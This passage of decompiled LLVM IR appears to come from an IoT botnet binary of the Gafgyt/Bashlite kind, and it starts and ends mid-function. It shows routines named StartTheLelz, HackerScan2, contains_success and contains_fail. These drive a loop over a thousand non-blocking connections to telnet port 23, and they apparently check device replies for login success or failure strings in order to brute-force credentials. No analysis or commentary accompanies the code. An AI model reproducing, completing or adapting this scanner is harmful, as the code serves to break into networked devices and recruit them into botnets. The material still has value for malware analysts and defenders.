  %v1_dc98 = urem i32 %arg1, 32
  %v6_dca0 = shl i32 1, %v1_dc98
  %v2_dca4 = or i32 %v2_dc90, %v6_dca0
  store i32 %v2_dca4, i32* %v1_dc90, align 4
  %v1_dcc4 = add i32 %arg1, 1
  %v2_dccc = ptrtoint i32* %stack_var_-160 to i32
  %v5_dce0 = call i32 @__libc_select(i32 %v1_dcc4, i32 %v2_dc34, i32 0, i32 0, i32 %v2_dccc)
  %v5_dcec = icmp sgt i32 %v5_dce0, 0
  br i1 %v5_dcec, label %dec_label_pc_dcfc, label %dec_label_pc_dcf0

dec_label_pc_dcf0:                                ; preds = %dec_label_pc_dc70
  br label %dec_label_pc_dd1c

dec_label_pc_dcfc:                                ; preds = %dec_label_pc_dc70
  %v5_dd10 = inttoptr i32 %arg3 to i32*
  %v6_dd10 = call i32 @__libc_recv(i32 %arg1, i32* %v5_dd10, i32 %arg4, i32 0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_dd1c

dec_label_pc_dd1c:                                ; preds = %dec_label_pc_dcf0, %dec_label_pc_dcfc
  %storemerge = phi i32 [ %v6_dd10, %dec_label_pc_dcfc ], [ 0, %dec_label_pc_dcf0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge25, { 1, 0 }
  uselistorder i32 %v2_dc34, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_dd1c, { 1, 0 }
  uselistorder label %dec_label_pc_dc48, { 1, 0 }
}

define i32 @contains_success(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_dd30 = load i32, i32* @fp, align 4
  %v3_dd48 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([4 x i8*]* @global_var_2e118.485 to i32))
  store i32 %v3_dd30, i32* @fp, align 4
  ret i32 %v3_dd48
}

define i32 @contains_fail(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_dd60 = load i32, i32* @fp, align 4
  %v3_dd78 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([7 x i8*]* @global_var_2e0f8.494 to i32))
  store i32 %v3_dd60, i32* @fp, align 4
  ret i32 %v3_dd78

; uselistorder directives
  uselistorder i32 (i32, i32)* @contains_string, { 2, 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  br label %dec_label_pc_ddbc

dec_label_pc_ddbc:                                ; preds = %dec_label_pc_ddbc, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_ddc0, %dec_label_pc_ddbc ]
  %v1_ddc0 = add i32 %stack_var_-24.0, 1
  %v3_ddcc = mul i32 %v1_ddc0, 4
  %v2_ddd8 = add i32 %v3_ddcc, %arg2
  %v1_dddc = inttoptr i32 %v2_ddd8 to i32*
  %v2_dddc = load i32, i32* %v1_dddc, align 4
  %v2_dde0 = icmp eq i32 %v2_dddc, 0
  br i1 %v2_dde0, label %dec_label_pc_de3c.preheader, label %dec_label_pc_ddbc

dec_label_pc_de3c.preheader:                      ; preds = %dec_label_pc_ddbc
  %v3_de14 = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_de3c

dec_label_pc_ddf4:                                ; preds = %dec_label_pc_de3c
  %v3_ddf8 = mul i32 %storemerge2, 4
  %v2_de04 = add i32 %v3_ddf8, %arg2
  %v1_de08 = inttoptr i32 %v2_de04 to i32*
  %v2_de08 = load i32, i32* %v1_de08, align 4
  %v4_de14 = call i32 @strcasestr(i8* %v3_de14, i32 %v2_de08, i32 %v3_ddf8)
  %v2_de1c = icmp eq i32 %v4_de14, 0
  %v1_de34 = add nuw i32 %storemerge2, 1
  br i1 %v2_de1c, label %dec_label_pc_de3c, label %dec_label_pc_de54

dec_label_pc_de3c:                                ; preds = %dec_label_pc_ddf4, %dec_label_pc_de3c.preheader
  %storemerge2 = phi i32 [ %v1_de34, %dec_label_pc_ddf4 ], [ 0, %dec_label_pc_de3c.preheader ]
  %v5_de48 = icmp slt i32 %storemerge2, %v1_ddc0
  br i1 %v5_de48, label %dec_label_pc_ddf4, label %dec_label_pc_de54

dec_label_pc_de54:                                ; preds = %dec_label_pc_de3c, %dec_label_pc_ddf4
  %storemerge3 = phi i32 [ 1, %dec_label_pc_ddf4 ], [ 0, %dec_label_pc_de3c ]
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %storemerge2, { 2, 0, 1 }
  uselistorder i32 %v1_ddc0, { 1, 0, 2 }
}

define i32 @StartTheLelz() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-608 = alloca i32, align 4
  %stack_var_-616 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_de64 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_de64, i32* %ip.global-to-local, align 4
  %v3_de68 = load i32, i32* @r4, align 4
  store i32 %v3_de68, i32* %stack_var_-24, align 4
  store i32 56944, i32* %stack_var_-4, align 4
  %v2_de6c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_de6c, i32* @fp, align 4
  store i32 1000, i32* %r3.global-to-local, align 4
  %v2_de90 = call i32 @time(i32* null)
  store i32 %v2_de90, i32* %r3.global-to-local, align 4
  store i32 %v2_de90, i32* @r4, align 4
  %v0_de9c = call i32 @rand_cmwc()
  %v0_dea4 = load i32, i32* @r4, align 4
  %v2_dea4 = xor i32 %v0_dea4, %v0_de9c
  store i32 %v2_dea4, i32* %r3.global-to-local, align 4
  %v1_deac = call i32 @srand(i32 %v2_dea4)
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-616, align 4
  %v1_dec4 = call i32 @__GI_htons(i32 23)
  %v2_dedc = ptrtoint i32* %stack_var_-608 to i32
  store i32 %v2_dedc, i32* %r3.global-to-local, align 4
  store i32 8, i32* @r2, align 4
  %v2_deec = bitcast i32* %stack_var_-608 to i8*
  %v3_deec = call i32 @__GI_memset(i8* %v2_deec, i32 0)
  %v1_def8 = call i32 @malloc(i32 1025)
  store i32 %v1_def8, i32* %r3.global-to-local, align 4
  store i32 1025, i32* @r2, align 4
  %v2_df14 = inttoptr i32 %v1_def8 to i8*
  %v3_df14 = call i32 @__GI_memset(i8* %v2_df14, i32 0)
  %v1_df38 = load i32, i32* @sp, align 4
  %v1_df48 = add i32 %v1_df38, -27997
  %v3_df4c = and i32 %v1_df48, -4
  store i32 5000, i32* %r3.global-to-local, align 4
  store i32 5000, i32* @r2, align 4
  %v2_df80 = inttoptr i32 %v3_df4c to i8*
  %v3_df80 = call i32 @__GI_memset(i8* %v2_df80, i32 0)
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1000, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_df90

dec_label_pc_df90:                                ; preds = %entry, %dec_label_pc_df90
  %storemerge514 = phi i32 [ 0, %entry ], [ %v1_e00c, %dec_label_pc_df90 ]
  %v2_dfa0 = mul nuw nsw i32 %storemerge514, 28
  %v2_dfa4 = add i32 %v2_dfa0, %v3_df4c
  store i32 %v2_dfa4, i32* %r3.global-to-local, align 4
  store i32 28, i32* @r2, align 4
  %v2_dfb4 = inttoptr i32 %v2_dfa4 to i8*
  %v3_dfb4 = call i32 @__GI_memset(i8* %v2_dfb4, i32 0)
  %v3_dfdc = add i32 %v2_dfa4, 9
  %v4_dfdc = inttoptr i32 %v3_dfdc to i8*
  store i8 1, i8* %v4_dfdc, align 1
  %v2_dffc = add i32 %v2_dfa4, 24
  %v2_e004 = inttoptr i32 %v2_dffc to i32*
  store i32 %v1_def8, i32* %v2_e004, align 4
  %v1_e00c = add nuw nsw i32 %storemerge514, 1
  store i32 %v1_e00c, i32* %r2.global-to-local, align 4
  store i32 1000, i32* %r3.global-to-local, align 4
  %v5_e020 = icmp slt i32 %v1_e00c, 1000
  br i1 %v5_e020, label %dec_label_pc_df90, label %dec_label_pc_e024.preheader

dec_label_pc_e024.preheader:                      ; preds = %dec_label_pc_df90
  %v19_de68 = ptrtoint i32* %stack_var_-24 to i32
  %v2_e0ac = add i32 %v3_df4c, 8
  %v2_e3a0 = add i32 %v3_df4c, 4
  %v3_e490 = bitcast i32* %stack_var_-616 to %sockaddr*
  %v2_e558 = ptrtoint i32* %stack_var_-328 to i32
  %v2_e654 = ptrtoint i32* %stack_var_-336 to i32
  %v2_e6b0 = ptrtoint i32* %stack_var_-344 to i32
  %v2_e6b4 = ptrtoint i32* %stack_var_-340 to i32
  %v2_e820 = add i32 %v3_df4c, 24
  %v2_f388 = add i32 %v3_df4c, 16
  br label %dec_label_pc_e024

dec_label_pc_e024:                                ; preds = %dec_label_pc_f5bc, %dec_label_pc_e024.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1000, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e030

dec_label_pc_e030:                                ; preds = %dec_label_pc_e024, %dec_label_pc_f5bc
  %storemerge612 = phi i32 [ 0, %dec_label_pc_e024 ], [ %v1_f5c0, %dec_label_pc_f5bc ]
  %v3_e03c = mul i32 %storemerge612, 4
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  %v2_e044 = mul nuw nsw i32 %storemerge612, 28
  %v2_e048 = add i32 %v2_e044, %v3_df4c
  %v2_e04c = add i32 %v2_e048, 16
  store i32 %v2_e04c, i32* %r3.global-to-local, align 4
  %v1_e050 = inttoptr i32 %v2_e04c to i32*
  %v2_e050 = load i32, i32* %v1_e050, align 4
  store i32 %v2_e050, i32* %r3.global-to-local, align 4
  %v2_e054 = icmp eq i32 %v2_e050, 0
  br i1 %v2_e054, label %dec_label_pc_e05c, label %dec_label_pc_e094

dec_label_pc_e05c:                                ; preds = %dec_label_pc_e030
  store i32 %storemerge612, i32* @r4, align 4
  %v2_e064 = call i32 @time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_e078 = load i32, i32* @r4, align 4
  %v3_e07c = mul i32 %v0_e078, 4
  store i32 %v3_e07c, i32* %r2.global-to-local, align 4
  %v2_e084 = mul i32 %v0_e078, 28
  %v2_e08c = add i32 %v2_f388, %v2_e084
  store i32 %v2_e08c, i32* %r3.global-to-local, align 4
  %v2_e090 = inttoptr i32 %v2_e08c to i32*
  store i32 %v2_e064, i32* %v2_e090, align 4
  br label %dec_label_pc_e094

dec_label_pc_e094:                                ; preds = %dec_label_pc_e030, %dec_label_pc_e05c
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  %v2_e0b0 = add i32 %v2_e0ac, %v2_e044
  store i32 %v2_e0b0, i32* %r3.global-to-local, align 4
  %v1_e0b4 = inttoptr i32 %v2_e0b0 to i8*
  %v2_e0b4 = load i8, i8* %v1_e0b4, align 4
  %v3_e0b4 = sext i8 %v2_e0b4 to i32
  %v4_e0b4 = zext i8 %v2_e0b4 to i32
  store i32 %v4_e0b4, i32* %r3.global-to-local, align 4
  switch i32 %v3_e0b4, label %dec_label_pc_f5bc [
    i32 0, label %dec_label_pc_e0e4
    i32 1, label %dec_label_pc_e56c.lr.ph
    i32 2, label %dec_label_pc_e9a0
    i32 3, label %dec_label_pc_eb24
    i32 4, label %dec_label_pc_ecdc
    i32 5, label %dec_label_pc_ee60
    i32 6, label %dec_label_pc_f018
    i32 7, label %dec_label_pc_f400
  ]

dec_label_pc_e0e4:                                ; preds = %dec_label_pc_e094
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  %v2_e100 = add i32 %v2_e048, 8
  store i32 %v2_e100, i32* %r3.global-to-local, align 4
  %v1_e104 = add i32 %v2_e048, 9
  %v2_e104 = inttoptr i32 %v1_e104 to i8*
  %v3_e104 = load i8, i8* %v2_e104, align 1
  %v7_e108 = icmp eq i8 %v3_e104, 1
  store i32 %storemerge612, i32* %r3.global-to-local, align 4
  br i1 %v7_e108, label %dec_label_pc_e110, label %dec_label_pc_e1bc

dec_label_pc_e110:                                ; preds = %dec_label_pc_e0e4
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  %v2_e12c = add i32 %v2_e048, 24
  store i32 %v2_e12c, i32* %r3.global-to-local, align 4
  %v1_e130 = inttoptr i32 %v2_e12c to i32*
  %v2_e130 = load i32, i32* %v1_e130, align 4
  store i32 %v2_e048, i32* %r3.global-to-local, align 4
  store i32 28, i32* @r2, align 4
  %v2_e15c = inttoptr i32 %v2_e048 to i8*
  %v3_e15c = call i32 @__GI_memset(i8* %v2_e15c, i32 0)
  store i32 %v2_e12c, i32* %r2.global-to-local, align 4
  store i32 %v2_e130, i32* %r3.global-to-local, align 4
  store i32 %v2_e130, i32* %v1_e130, align 4
  store i32 %storemerge612, i32* @r4, align 4
  %v1_e18c = call i32 @HackerScan2(i32 24)
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_e19c = load i32, i32* @r4, align 4
  %v3_e1a0 = mul i32 %v0_e19c, 4
  store i32 %v3_e1a0, i32* %r2.global-to-local, align 4
  %v2_e1a8 = mul i32 %v0_e19c, 28
  %v2_e1b0 = add i32 %v2_e3a0, %v2_e1a8
  store i32 %v2_e1b0, i32* %r3.global-to-local, align 4
  %v2_e1b4 = inttoptr i32 %v2_e1b0 to i32*
  store i32 %v1_e18c, i32* %v2_e1b4, align 4
  br label %dec_label_pc_e348

dec_label_pc_e1bc:                                ; preds = %dec_label_pc_e0e4
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_e100, i32* %r3.global-to-local, align 4
  %v3_e1dc = load i8, i8* %v2_e104, align 1
  %v4_e1dc = zext i8 %v3_e1dc to i32
  store i32 %v4_e1dc, i32* %r3.global-to-local, align 4
  %v2_e1e0 = icmp eq i8 %v3_e1dc, 0
  br i1 %v2_e1e0, label %dec_label_pc_e1e8, label %dec_label_pc_e348

dec_label_pc_e1e8:                                ; preds = %dec_label_pc_e1bc
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_e100, i32* %r3.global-to-local, align 4
  %v1_e20c = add i32 %v2_e048, 11
  %v2_e20c = inttoptr i32 %v1_e20c to i8*
  %v3_e20c = load i8, i8* %v2_e20c, align 1
  %v1_e210 = add i8 %v3_e20c, 1
  store i32 8, i32* %lr.global-to-local, align 4
  store i8 %v1_e210, i8* %v2_e20c, align 1
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_e100, i32* %r3.global-to-local, align 4
  %v1_e264 = add i32 %v2_e048, 10
  %v2_e264 = inttoptr i32 %v1_e264 to i8*
  %v3_e264 = load i8, i8* %v2_e264, align 2
  %v1_e268 = add i8 %v3_e264, 1
  store i32 %v3_df4c, i32* %ip.global-to-local, align 4
  store i8 %v1_e268, i8* %v2_e264, align 2
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_e100, i32* %r3.global-to-local, align 4
  %v3_e2b8 = load i8, i8* %v2_e20c, align 1
  %v7_e2bc = icmp eq i8 %v3_e2b8, 22
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_e048, i32* %r3.global-to-local, align 4
  br i1 %v7_e2bc, label %dec_label_pc_e2c4, label %dec_label_pc_e2f0

dec_label_pc_e2c4:                                ; preds = %dec_label_pc_e1e8
  store i32 %v2_e100, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i8 1, i8* %v2_e104, align 1
  br label %dec_label_pc_f5bc

dec_label_pc_e2f0:                                ; preds = %dec_label_pc_e1e8
  store i32 %v2_e100, i32* %r3.global-to-local, align 4
  %v3_e310 = load i8, i8* %v2_e264, align 2
  %v4_e310 = zext i8 %v3_e310 to i32
  store i32 %v4_e310, i32* %r3.global-to-local, align 4
  %v7_e314 = icmp eq i8 %v3_e310, 22
  br i1 %v7_e314, label %dec_label_pc_e31c, label %dec_label_pc_e348

dec_label_pc_e31c:                                ; preds = %dec_label_pc_e2f0
  store i32 %v2_e100, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i8 1, i8* %v2_e104, align 1
  br label %dec_label_pc_f5bc

dec_label_pc_e348:                                ; preds = %dec_label_pc_e2f0, %dec_label_pc_e1bc, %dec_label_pc_e110
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-616, align 4
  %v1_e35c = call i32 @__GI_htons(i32 23)
  store i32 %v2_dedc, i32* %r3.global-to-local, align 4
  store i32 8, i32* @r2, align 4
  %v3_e384 = call i32 @__GI_memset(i8* %v2_deec, i32 0)
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  %v2_e3a4 = add i32 %v2_e3a0, %v2_e044
  store i32 %v2_e3a4, i32* %r3.global-to-local, align 4
  %v1_e3a8 = inttoptr i32 %v2_e3a4 to i32*
  %v2_e3a8 = load i32, i32* %v1_e3a8, align 4
  store i32 %v2_e3a8, i32* %r3.global-to-local, align 4
  store i32 %storemerge612, i32* @r4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_e3c0 = call i32 @socket()
  %v0_e3c8 = load i32, i32* @r4, align 4
  %v2_e3d4 = mul i32 %v0_e3c8, 28
  %v2_e3d8 = add i32 %v2_e3d4, %v3_df4c
  %v2_e3dc = inttoptr i32 %v2_e3d8 to i32*
  store i32 %v0_e3c0, i32* %v2_e3dc, align 4
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_e048, i32* %r3.global-to-local, align 4
  %v1_e3f8 = inttoptr i32 %v2_e048 to i32*
  %v2_e3f8 = load i32, i32* %v1_e3f8, align 4
  store i32 %v2_e3f8, i32* %r3.global-to-local, align 4
  %v7_e3fc = icmp eq i32 %v2_e3f8, -1
  br i1 %v7_e3fc, label %dec_label_pc_f5bc, label %dec_label_pc_e404

dec_label_pc_e404:                                ; preds = %dec_label_pc_e348
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_e048, i32* %r3.global-to-local, align 4
  %v2_e41c = load i32, i32* %v1_e3f8, align 4
  store i32 %v2_e41c, i32* @r4, align 4
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_e048, i32* %r3.global-to-local, align 4
  %v2_e438 = load i32, i32* %v1_e3f8, align 4
  store i32 %v2_e438, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_e448 = call i32 @__libc_fcntl(i32 %v2_e438, i32 3)
  %v1_e450 = or i32 %v2_e448, 2048
  store i32 %v1_e450, i32* @r3, align 4
  %v0_e454 = load i32, i32* @r4, align 4
  store i32 %v1_e450, i32* %r2.global-to-local, align 4
  %v2_e460 = call i32 @__libc_fcntl(i32 %v0_e454, i32 4)
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_e048, i32* %r3.global-to-local, align 4
  %v2_e47c = load i32, i32* %v1_e3f8, align 4
  store i32 %v2_e47c, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_e490 = call i32 @__libc_connect(i32 %v2_e47c, %sockaddr* nonnull %v3_e490, i32 16)
  store i32 %v4_e490, i32* %r3.global-to-local, align 4
  %v3_e498 = icmp eq i32 %v4_e490, -1
  br i1 %v3_e498, label %dec_label_pc_e4a0, label %dec_label_pc_e504

dec_label_pc_e4a0:                                ; preds = %dec_label_pc_e404
  %v0_e4a0 = call i32 @__GI___errno_location()
  store i32 %v0_e4a0, i32* %r3.global-to-local, align 4
  %v1_e4a8 = inttoptr i32 %v0_e4a0 to i32*
  %v2_e4a8 = load i32, i32* %v1_e4a8, align 4
  store i32 %v2_e4a8, i32* %r3.global-to-local, align 4
  %v7_e4ac = icmp eq i32 %v2_e4a8, 115
  br i1 %v7_e4ac, label %dec_label_pc_e504, label %dec_label_pc_e4b4

dec_label_pc_e4b4:                                ; preds = %dec_label_pc_e4a0
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_e048, i32* %r3.global-to-local, align 4
  %v2_e4cc = load i32, i32* %v1_e3f8, align 4
  store i32 %v2_e4cc, i32* %r3.global-to-local, align 4
  %v3_e4d4 = call i32 @sclose(i32 %v2_e4cc, i32 %v3_df4c, i32 %v3_e03c)
  store i32 %v2_e100, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i8 1, i8* %v2_e104, align 1
  br label %dec_label_pc_f5bc

dec_label_pc_e504:                                ; preds = %dec_label_pc_e404, %dec_label_pc_e4a0
  %v3_e528 = inttoptr i32 %v2_e100 to i8*
  store i8 1, i8* %v3_e528, align 4
  store i32 %v2_e04c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %v1_e050, align 4
  br label %dec_label_pc_f5bc

dec_label_pc_e56c.lr.ph:                          ; preds = %dec_label_pc_e094
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e56c

dec_label_pc_e56c:                                ; preds = %dec_label_pc_e56c.lr.ph, %dec_label_pc_e56c
  %storemerge711 = phi i32 [ 0, %dec_label_pc_e56c.lr.ph ], [ %v1_e580, %dec_label_pc_e56c ]
  store i32 %v2_e558, i32* %r2.global-to-local, align 4
  %v5_e578 = mul nuw nsw i32 %storemerge711, 4
  %v6_e578 = add i32 %v5_e578, %v2_e558
  %v7_e578 = inttoptr i32 %v6_e578 to i32*
  store i32 0, i32* %v7_e578, align 4
  %v1_e580 = add nuw nsw i32 %storemerge711, 1
  store i32 %v1_e580, i32* %r3.global-to-local, align 4
  %tmp47 = icmp ult i32 %v1_e580, 32
  br i1 %tmp47, label %dec_label_pc_e56c, label %dec_label_pc_e594

dec_label_pc_e594:                                ; preds = %dec_label_pc_e56c
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_e048, i32* %r3.global-to-local, align 4
  %v1_e5ac = inttoptr i32 %v2_e048 to i32*
  %v2_e5ac = load i32, i32* %v1_e5ac, align 4
  %v3_e5b0 = udiv i32 %v2_e5ac, 32
  %v3_e5c4 = mul nuw nsw i32 %v3_e5b0, 4
  %v2_e5cc = add i32 %v3_e5c4, %v19_de68
  store i32 %v2_e5cc, i32* %r2.global-to-local, align 4
  %v2_e5d0 = add i32 %v2_e5cc, -304
  store i32 %v2_e5d0, i32* %r3.global-to-local, align 4
  %v1_e5d4 = inttoptr i32 %v2_e5d0 to i32*
  %v2_e5d4 = load i32, i32* %v1_e5d4, align 4
  store i32 %v2_e5d4, i32* %ip.global-to-local, align 4
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_e048, i32* %r3.global-to-local, align 4
  %v2_e5f0 = load i32, i32* %v1_e5ac, align 4
  %v1_e5f4 = urem i32 %v2_e5f0, 32
  %v6_e5fc = shl i32 1, %v1_e5f4
  %v2_e600 = or i32 %v6_e5fc, %v2_e5d4
  store i32 %v2_e600, i32* %v1_e5d4, align 4
  store i32 0, i32* %stack_var_-336, align 4
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_e048, i32* %r3.global-to-local, align 4
  %v2_e648 = load i32, i32* %v1_e5ac, align 4
  %v1_e64c = add i32 %v2_e648, 1
  store i32 %v1_e64c, i32* %r2.global-to-local, align 4
  store i32 %v2_e558, i32* %ip.global-to-local, align 4
  %v1_e658 = load i32, i32* @sp, align 4
  %v2_e658 = inttoptr i32 %v1_e658 to i32*
  store i32 %v2_e654, i32* %v2_e658, align 4
  %v0_e65c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_e558, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_e66c = load i32, i32* %stack_var_-336, align 4
  %v5_e66c = call i32 @__libc_select(i32 %v0_e65c, i32 0, i32 %v2_e558, i32 0, i32 %v4_e66c)
  store i32 %v5_e66c, i32* %r3.global-to-local, align 4
  %v7_e67c = icmp eq i32 %v5_e66c, 1
  br i1 %v7_e67c, label %dec_label_pc_e684, label %dec_label_pc_e868

dec_label_pc_e684:                                ; preds = %dec_label_pc_e594
  store i32 4, i32* %stack_var_-340, align 4
  store i32 0, i32* %stack_var_-344, align 4
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_e048, i32* %r3.global-to-local, align 4
  %v2_e6ac = load i32, i32* %v1_e5ac, align 4
  store i32 %v2_e6ac, i32* %r2.global-to-local, align 4
  store i32 %v2_e6b0, i32* %ip.global-to-local, align 4
  %v1_e6b8 = load i32, i32* @sp, align 4
  %v2_e6b8 = inttoptr i32 %v1_e6b8 to i32*
  store i32 %v2_e6b4, i32* %v2_e6b8, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 %v2_e6b0, i32* %r3.global-to-local, align 4
  %v0_e6cc = call i32 @getsockopt()
  %v3_e6d0 = load i32, i32* %stack_var_-344, align 4
  %v2_e6d4 = icmp eq i32 %v3_e6d0, 0
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_e048, i32* %r3.global-to-local, align 4
  %v2_e76c = load i32, i32* %v1_e5ac, align 4
  br i1 %v2_e6d4, label %dec_label_pc_e754, label %dec_label_pc_e6dc

dec_label_pc_e6dc:                                ; preds = %dec_label_pc_e684
  store i32 %v2_e76c, i32* %r3.global-to-local, align 4
  %v3_e6fc = call i32 @sclose(i32 %v2_e76c, i32 %v3_df4c, i32 %v3_e03c)
  %v2_e71c = add i32 %v2_e048, 8
  %v3_e724 = inttoptr i32 %v2_e71c to i8*
  store i8 0, i8* %v3_e724, align 4
  store i32 %v2_e71c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_e74c = add i32 %v2_e048, 9
  %v4_e74c = inttoptr i32 %v3_e74c to i8*
  store i8 1, i8* %v4_e74c, align 1
  br label %dec_label_pc_f5bc

dec_label_pc_e754:                                ; preds = %dec_label_pc_e684
  store i32 %v2_e76c, i32* @r4, align 4
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_e048, i32* %r3.global-to-local, align 4
  %v2_e788 = load i32, i32* %v1_e5ac, align 4
  store i32 %v2_e788, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_e798 = call i32 @__libc_fcntl(i32 %v2_e788, i32 3)
  %v1_e7a0 = and i32 %v2_e798, -2049
  store i32 %v1_e7a0, i32* @r3, align 4
  %v0_e7a4 = load i32, i32* @r4, align 4
  store i32 %v1_e7a0, i32* %r2.global-to-local, align 4
  %v2_e7b0 = call i32 @__libc_fcntl(i32 %v0_e7a4, i32 4)
  store i32 0, i32* %v1_e050, align 4
  %v2_e7f8 = add i32 %v2_e048, 20
  store i32 %v2_e7f8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_e800 = inttoptr i32 %v2_e7f8 to i8*
  store i8 0, i8* %v3_e800, align 4
  %v0_e804 = load i32, i32* %r3.global-to-local, align 4
  %v1_e804 = trunc i32 %v0_e804 to i8
  %v2_e804 = load i32, i32* %r2.global-to-local, align 4
  %v3_e804 = add i32 %v2_e804, 1
  %v4_e804 = inttoptr i32 %v3_e804 to i8*
  store i8 %v1_e804, i8* %v4_e804, align 1
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  %v2_e824 = add i32 %v2_e044, %v2_e820
  store i32 %v2_e824, i32* %r3.global-to-local, align 4
  %v1_e828 = inttoptr i32 %v2_e824 to i32*
  %v2_e828 = load i32, i32* %v1_e828, align 4
  store i32 %v2_e828, i32* %r3.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_e838 = inttoptr i32 %v2_e828 to i8*
  %v3_e838 = call i32 @__GI_memset(i8* %v2_e838, i32 0)
  %v2_e858 = add i32 %v2_e048, 8
  store i32 %v2_e858, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v3_e860 = inttoptr i32 %v2_e858 to i8*
  store i8 2, i8* %v3_e860, align 4
  br label %dec_label_pc_f5bc

dec_label_pc_e868:                                ; preds = %dec_label_pc_e594
  %v3_e86c = icmp eq i32 %v5_e66c, -1
  store i32 %storemerge612, i32* %r3.global-to-local, align 4
  br i1 %v3_e86c, label %dec_label_pc_e874, label %dec_label_pc_e8ec

dec_label_pc_e874:                                ; preds = %dec_label_pc_e868
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_e048, i32* %r3.global-to-local, align 4
  %v2_e88c = load i32, i32* %v1_e5ac, align 4
  store i32 %v2_e88c, i32* %r3.global-to-local, align 4
  %v3_e894 = call i32 @sclose(i32 %v2_e88c, i32 %v3_df4c, i32 %v3_e03c)
  %v2_e8b4 = add i32 %v2_e048, 8
  %v3_e8bc = inttoptr i32 %v2_e8b4 to i8*
  store i8 0, i8* %v3_e8bc, align 4
  store i32 %v2_e8b4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_e8e4 = add i32 %v2_e048, 9
  %v4_e8e4 = inttoptr i32 %v3_e8e4 to i8*
  store i8 1, i8* %v4_e8e4, align 1
  br label %dec_label_pc_f5bc

dec_label_pc_e8ec:                                ; preds = %dec_label_pc_e868
